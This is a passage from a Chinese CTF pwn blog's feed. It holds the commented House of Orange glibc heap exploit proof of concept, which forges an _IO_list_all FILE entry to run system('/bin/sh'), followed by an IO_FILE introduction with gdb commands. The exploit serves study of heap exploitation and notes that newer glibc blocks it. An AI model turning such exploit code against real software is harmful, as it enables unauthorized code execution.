class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  House of Orange 使用一个堆溢出去破坏_IO_list_all指针</span></span><br><span class="line"><span class="comment">  这要求堆地址和libc地址的泄露</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   这个函数仅仅是为了展现对这个场景的模拟,这个函数系统的地址是已知的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><h1 id="house_of_orange_level_1"><a class="markdownIt-Anchor" href="#house_of_orange_level_1"></a> house_of_orange_level_1</h1><h1 id="house_of_orange_level_2"><a class="markdownIt-Anchor" href="#house_of_orange_level_2"></a> house_of_orange_level_2</h1><h1 id="house_of_orange_level_3"><a class="markdownIt-Anchor" href="#house_of_orange_level_3"></a> house_of_orange_level_3</h1><h1 id="house_of_orange_level_4"><a class="markdownIt-Anchor" href="#house_of_orange_level_4"></a> house_of_orange_level_4</h1><h1 id="house_of_orange_level_5"><a class="markdownIt-Anchor" href="#house_of_orange_level_5"></a> house_of_orange_level_5</h1><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>]]></content>
    
    
    <summary type="html">前言：byteCTF太牢，安卓逆向看了一下Fruttle，还是写不出来，直接看新题pwn，堆的那题</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆IO_FILE基础</title>
    <link href="http://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86IO-FILE%E5%9F%BA%E7%A1%80/"/>
    <id>http://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86IO-FILE%E5%9F%BA%E7%A1%80/</id>
    <published>2025-02-12T14:28:15.000Z</published>
    <updated>2025-02-25T03:39:20.887Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：[<a href="https://bbs.kanxue.com/thread-275968.htm">原创]无路远征——GLIBC2.37后时代的IO攻击之道（零）-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></li><li><code>IO</code>也就是输入输出的意思，但是<code>C</code>语言的输入输出的函数有很多，例如：<code>puts</code>、<code>printf</code>、<code>write</code>、<code>stdin</code>、<code>stdout</code>、<code>scanf</code>、<code>read</code>等与输入输出相关的函数。</li><li>而我们所说的打<code>IO</code>打的是我们封装到比较上层的函数，比如<code>puts</code>、<code>printf</code>这类的上层封装的函数。</li><li>而<code>read</code>、<code>write</code>这两个是比较底层的，系统调用<code>syscall</code>的输入输出，一般都是调用这两个函数。</li><li>而<code>puts</code>、<code>printf</code>等这些<code>IO</code>函数最后都会通过<code>write</code>这个底层函数与操作系统交互。</li><li>所以我们所说的打<code>IO</code>，打的就是这种上层输入输出函数。在调用这些函数的时候会经过一些<code>指针</code>、<code>结构体</code>、<code>函数指针</code>等，所以我们通过劫持<code>指针</code>、<code>伪造IO结构体</code>、<code>绕过检查机制</code>从而<code>getshll</code>或者执行<code>shellcode</code>。</li><li>与<code>IO</code>相关的都可以在<code>glibc</code>源码中，<code>/path/to/glibc2.23/libio</code>中可以看到。</li></ul><h1 id="io_file结构体起源"><a class="markdownIt-Anchor" href="#io_file结构体起源"></a> IO_FILE结构体起源</h1><ul><li>如果出过<code>pwn</code>题或者做过<code>全缓冲</code>的<code>pwn</code>题就会了解到这个函数。和缓冲区的三种工作模式，<code>无缓冲</code>、<code>行缓冲</code>、<code>全缓冲</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>为什么要设置这三种模式，这就和<code>硬件</code>、<code>操作系统</code>、<code>程序</code>三者有关。首先程序要读写硬盘或者是输出到屏幕中，这些都是要通过系统调用<code>syscall</code>，进行<code>write</code>、<code>read</code>系统调用。</li><li>而何时进行系统调用，这就成为了设计<code>IO</code>的一个重要问题。如果每一个字节都需要使用<code>syscall</code>系统调用（即无缓冲模式）。向硬件进行读写操作，这就会大大降级操作系统的效率，并且硬件频繁读写也会造成更快的损坏。</li><li>为了减少这种情况，在设计<code>IO</code>的时候就会出现导致，设置了<code>缓冲区</code>，要输入的数据或者要输出的数据都会先被放入缓冲区，直到缓冲区满了之后，再进行系统调用，将缓冲区存储的内容写入到屏幕或者其他硬件中（全缓冲），以便提高操作系统的效率，提高硬件的使用寿命，这也就出现了现在的<code>IO_FILE</code>结构体。</li><li>接下来总结一下<code>glibc</code>封装的上层函数中与输入输出相关的函数，对于<code>IO</code>的攻击一般就攻击这些<code>IO</code>函数的结构体``。<ul><li>标准输入函数<ul><li><code>gets()</code>、<code>fgets()</code>、<code>scanf()</code>、<code>fscanf()</code>、<code>sscanf()</code>、<code>getc()</code>、<code>fgetc()</code>、<code>getchar()</code>、<code>getline()</code>、<code>getdelim()</code></li></ul></li><li>标准输出函数<ul><li><code>printf()</code>、<code>fprintf()</code>、<code>sprintf()</code>、<code>snprintf()</code>、<code>putc()</code>、<code>fputc()</code>、<code>putchar()</code>、<code>puts()</code></li></ul></li><li>文件操作函数：<ul><li><code>fopen()</code>、<code>freopen()</code>、<code>fdopen()</code>、<code>fclose()</code>、<code>fflush()</code>、<code>setbuf()</code>、<code>setvbuf()</code>、<code>fread()</code>、<code>fwrite()</code>、<code>fseek()</code>、<code>ftell()</code>、<code>fewind()</code>、<code>rewind()</code></li></ul></li><li>格式化字符串相关函数：<ul><li><code>printf()</code>、<code>fprintf()</code>、<code>sprintf()</code>、<code>snprintf()</code>、<code>vprintf()</code>、<code>vfprintf()</code>、<code>vsprintf()</code>、<code>vsnprintf()</code></li></ul></li><li>其他相关函数：<ul><li><code>perror()</code>、<code>tmpfile()</code>、<code>clearerr()</code>、<code>feof()</code>、<code>ferror()</code>、<code>stdout</code>、<code>stdout()</code>、<code>stdin()</code>、<code>stderror()</code></li></ul></li></ul></li></ul><h1 id="关于io_file相关动调"><a class="markdownIt-Anchor" href="#关于io_file相关动调"></a> 关于IO_FILE相关动调</h1><ul><li><p>写介绍几个比较重要的<code>IO</code>结构体，并且说明这写结构体在<code>glibc2.23</code>源码的什么位置。</p></li><li><p>这里先汇总一下与<code>IO_FILE</code>相关动调命令，与<code>IO_FILE</code>相关的调试基本上就是打印结构体。可以在<code>gdb</code>中使用<code>p</code>命令打印出结构体的具体存储的值</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p stdout</span><br><span class="line">p _IO_2_1_stdout_</span><br><span class="line">p _IO_file_jumps</span><br><span class="line">p *(struct _IO_FILE *) _IO_list_all</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>接下来调试几个上层的输出函数。来对<code>IO</code>调用有个总体了解。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">puts-&gt;_IO_file_xsputn</span><br><span class="line">printf-&gt;__vfprintf_internal-&gt;_IO_file_xsputn-&gt;_IO_file_overflow-&gt;_IO_do_write</span><br><span class="line">-&gt;_IO_default_xsputn-&gt;_IO_file_overflow</span><br></pre></td></tr></table></figure><h1 id="io_file相关源码"><a class="markdownIt-Anchor" href="#io_file相关源码"></a> IO_FILE相关源码</h1><h1 id="io_file基础"><a class="markdownIt-Anchor" href="#io_file基础"></a> IO_FILE基础</h1>]]></content>
    
    
    <summary type="html">前言：终于到IO了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>2025hgame week1</title>
    <link href="http://iyheart.github.io/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/"/>
    <id>http://iyheart.github.io/2025/02/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025hgame-week1/</id>
    <published>2025-02-11T16:59:14.000Z</published>
    <updated>2025-02-12T03:19:17.707Z</updated>
    
